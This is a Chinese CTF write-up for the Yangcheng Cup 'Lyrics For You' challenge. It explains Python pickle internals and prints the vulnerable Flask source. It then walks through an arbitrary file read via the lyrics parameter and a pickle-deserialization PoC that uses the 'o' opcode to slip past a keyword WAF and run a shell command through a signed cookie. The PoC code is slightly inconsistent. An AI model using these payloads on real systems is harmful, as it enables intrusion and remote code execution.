# 羊城杯 Lyrics For You WP

>~~本来想详细写一下但是发现已经有很多优秀文章了，所以不再斗胆一写了~~
>
>先放点关于pickle的文章
>
>[Pickle反序列化 - 枫のBlog](https://goodapple.top/archives/1069)
>
>[通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012?time__1311=n4%2BxnD0Dy7it0QYuq05%2BbWDODc0M%3DtkHe4D#toc-0)
>
>[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势](https://zhuanlan.zhihu.com/p/89132768)

## 什么是pickle

[pickle](https://docs.python.org/3/library/pickle.html)是python的一个序列化模块，相较于原始的`marshal`模块会更常用。`pickling`是通过执行`dump()`和`dumps()` 函数将输入序列化为文件或字节流的过程，对应的`unpickling`则是通过`load()`和`loads`将文件或字节流中的序列号字符串转化为原始对象的过程

pickle基于`Python Virtual Machine`运行，实际上`pickling`的过程就是将python对象转化为`PVM`可以执行的二进制操作码`OpCode`的过程；而`unpickling`的过程就是调用`PVM`执行操作码重新构建原对象的过程。栈操作`stack oporations`是pickle的基础。

pickle有六版协议，但每次更新都是在添加新语句，所以协议具有向前兼容性。在`Python3.8`之后默认的协议是`Protocol 4`。不过仍然可以通过`dumps(op,0)`这样的方式指定使用旧协议

## Lyrics For You

羊城杯的一道主要考点在pickle反序列化的题

可以发现query lyrics参数可控，`?lyrics=/path/to/file`实现任意文件读

`?lyrics=/proc/self/cmdline` 回显 python3-u/usr/etc/app/app.py

查询该地址得到源码，同时通过`import`的信息可以读取`pickle.py`和`secret_key.py`

app.py:
```python
import os  
import random  
from config.secret_key import secret_code  
from flask import Flask, make_response, request, render_template  
from cookie import set_cookie, cookie_check, get_cookie  
import pickle  
  
app = Flask(__name__)  
app.secret_key = random.randbytes(16)  
  
  
class UserData:  
    def __init__(self, username):  
        self.username = username  
  
  
def Waf(data):  
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']  
    valid = False  
    for word in blacklist:  
        if word.lower() in data.lower():  
            valid = True  
            break    return valid  
  
  
@app.route("/", methods=['GET'])  
def index():  
    return render_template('index.html')  
  
  
@app.route("/lyrics", methods=['GET'])  
def lyrics():  
    resp = make_response()  
    resp.headers["Content-Type"] = 'text/plain; charset=UTF-8'  
    query = request.args.get("lyrics")  
    path = os.path.join(os.getcwd() + "/lyrics", query)  
    try:  
        with open(path) as f:  
            res = f.read()  
    except Exception as e:  
        return "No lyrics found"  
    return res  
  
  
@app.route("/login", methods=['POST', 'GET'])  
def login():  
    if request.method == 'POST':  
        username = request.form["username"]  
        user = UserData(username)  
        res = {"username": user.username}  
        return set_cookie("user", res, secret=secret_code)  
    return render_template('login.html')  
  
  
@app.route("/board", methods=['GET'])  
def board():  
    invalid = cookie_check("user", secret=secret_code)  
    if invalid:  
        return "Nope, invalid code get out!"  
  
    data = get_cookie("user", secret=secret_code)  
    if isinstance(data, bytes):  
        a = pickle.loads(data)  
        data = str(data, encoding="utf-8")  
  
    if "username" not in data:  
        return render_template('user.html', name="guest")  
  
    if data["username"] == "admin":  
        return render_template('admin.html', name=data["username"])  
  
    return render_template('user.html', name=data["username"])  
  
  
if __name__ == "__main__":  
    os.chdir(os.path.dirname(__file__))  
    app.run(host="0.0.0.0", port=8080)
```

可以发现`/board`路由下有一个很刻意的`a = pickle.loads(data)`，只要构造cookie注入满足要求的data数据即可实现反序列化攻击

poc:
```python
import pickle

opcode = (b'''(cos  
system  
S"'ls / > /tmp/flag'"  
o.''')  
  
cookie = cookie_encode(  
("user", payload),  
"EnjoyThePlayTime123456"  
)

print(cookie)
```

用`o`代替`R`执行操作绕过`waf`，尝试直接反弹shell，但在靶机上没成功，后将查询结果写到`/tmp/flag`再利用一开始的任意读查看 *idea鸣谢柏师傅*

## 题外话

查wp的时候发现有类似原题 `SekaiCTF 2022 Bottle Poem`，发现`Bottle Poem`这题都是通过构造函数后dumps来实现的。用这样的方式dump出来的操作码就可以规避一些Protocol 1的可见字符过滤。~~但如果是这样未免有些过于为了出题而出题了~~
